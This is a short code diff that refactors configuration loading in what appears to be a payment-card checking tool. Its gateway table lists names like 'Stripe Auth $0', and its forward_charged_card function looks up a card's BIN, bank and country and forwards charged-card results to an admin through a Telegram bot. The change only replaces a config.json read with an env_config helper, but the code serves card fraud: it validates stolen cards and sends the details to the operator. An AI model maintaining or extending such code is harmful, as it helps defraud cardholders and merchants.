@@ -2,6 +2,7 @@ import sys
 import json
 import os
 import requests
+from env_config import get_setting
 
 GATEWAY_NAMES = {
     "st": "Stripe Auth $0",
@@ -70,20 +71,12 @@ def send_dm(bot_token, chat_id, text):
 
 
 def forward_charged_card(user_id, card, gateway, response_msg, user_name="", site="", amount="", url="", admin_site=""):
-    config_path = os.path.join(os.path.dirname(__file__), "config.json")
-    try:
-        with open(config_path, "r") as f:
-            config = json.load(f)
-    except Exception:
-        print(json.dumps({"sent": False, "error": "Config not found"}))
-        return
-
-    bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
+    bot_token = get_setting("TELEGRAM_BOT_TOKEN")
     if not bot_token:
         print(json.dumps({"sent": False, "error": "No bot token"}))
         return
 
-    raw_admin = config.get("TELEGRAM_ADMIN_ID", "")
+    raw_admin = get_setting("TELEGRAM_ADMIN_ID")
     first_admin = str(raw_admin).split(",")[0].strip()
 
     brand, btype, level, bank, country, flag, bin6 = lookup_bin(card)
